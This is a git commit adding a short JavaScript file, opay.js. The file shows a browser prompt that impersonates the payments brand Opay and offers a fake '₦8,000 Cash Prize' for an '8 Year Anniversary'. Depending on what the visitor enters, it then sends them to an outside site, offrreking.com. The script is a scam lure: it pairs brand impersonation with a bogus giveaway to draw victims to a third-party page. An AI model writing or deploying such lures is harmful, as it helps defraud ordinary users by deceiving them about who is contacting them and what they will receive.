1b0fc4bfbe1a2a827b3f8d1bf35583417a7a55aa
offrreking <visage-boxiest9x@icloud.com>
2026-09-24 11:54:42 +0100

    Create opay.js

---
+++ opay.js
@@ -0,0 +1,5 @@
+var password = '₦8,000 Cash Prize'
+password=prompt('Opay: in Celebration of Opay 8 Year Anniversary We are giving out ₦8,000 Cash Prize, press OK to Proceed','₦8,000 Cash Prize');
+if (password != '₦8,000 Cash Prize') {
+location.href='https://www.offrreking.com/8000-cash-prize';
+}
